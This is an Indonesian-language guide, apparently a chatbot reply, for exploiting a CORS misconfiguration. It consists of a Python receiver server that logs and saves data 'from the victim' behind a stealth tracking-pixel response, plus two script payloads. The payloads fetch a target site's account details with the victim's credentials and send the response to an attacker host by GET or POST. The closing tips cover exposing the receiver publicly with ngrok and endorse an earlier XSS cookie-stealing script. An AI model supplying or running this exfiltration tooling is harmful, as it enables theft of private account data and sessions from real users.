## server_CORS.py (CORS receiver)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote
import json

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if params:
            data = params.get("d", [""])[0]
            data = unquote(data)

            print("\n" + "="*60)
            print("[✓] DATA DITERIMA (CORS)!")
            print("="*60)

            # Coba parse JSON (kalau valid)
            try:
                parsed_json = json.loads(data)
                print("[+] Format: JSON\n")
                print(json.dumps(parsed_json, indent=4))
            except:
                print("[+] Format: RAW\n")
                print(data)

            print("="*60)

            # Simpan ke file
            with open("result.txt", "w") as f:
                f.write(data)

        # Response ringan (biar stealth, seperti pixel)
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        self.wfile.write(
            b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!'
            b'\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01'
            b'\x00\x00\x02\x02D\x01\x00;'
        )

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode()

        print("\n" + "="*60)
        print("[✓] DATA POST DITERIMA!")
        print("="*60)

        try:
            parsed_json = json.loads(body)
            print("[+] Format: JSON\n")
            print(json.dumps(parsed_json, indent=4))
        except:
            print("[+] Format: RAW\n")
            print(body)

        print("="*60)

        with open("result_post.txt", "w") as f:
            f.write(body)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass


if __name__ == '__main__':
    print("[*] CORS receiver jalan di http://localhost:8000")
    print("[*] Menunggu data dari victim...")
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

---

## Fitur


* fokus `data API`
* bisa JSON / raw
* tidak split cookie lagi

---

## Payload yang cocok untuk server ini

GET version:

```html
<script>
fetch("https://target.com/accountDetails", {
    credentials: "include"
})
.then(r => r.text())
.then(data => {
    fetch("http://YOUR-SERVER:8000/?d=" + encodeURIComponent(data));
});
</script>
```

POST version (lebih “bersih”):

```html
<script>
fetch("https://target.com/accountDetails", {
    credentials: "include"
})
.then(r => r.text())
.then(data => {
    fetch("http://YOUR-SERVER:8000/", {
        method: "POST",
        body: data
    });
});
</script>
```

---

## Insight penting (ini inti CORS exploit)

* XSS → ambil `document.cookie`
* CORS → ambil **response server**
* Receiver → sama konsepnya (cuma beda format data)

---

## Tips biar makin “pro”

* pakai POST kalau data panjang (biar gak kepotong URL)
* tambahin logging timestamp kalau mau tracking
* expose pakai `ngrok` biar publik

---

## Kesimpulan

✔ Script kamu sebelumnya sudah benar (untuk XSS)
✔ Versi ini = upgrade untuk CORS
✔ Konsepnya sama: **nerima data dari browser korban**

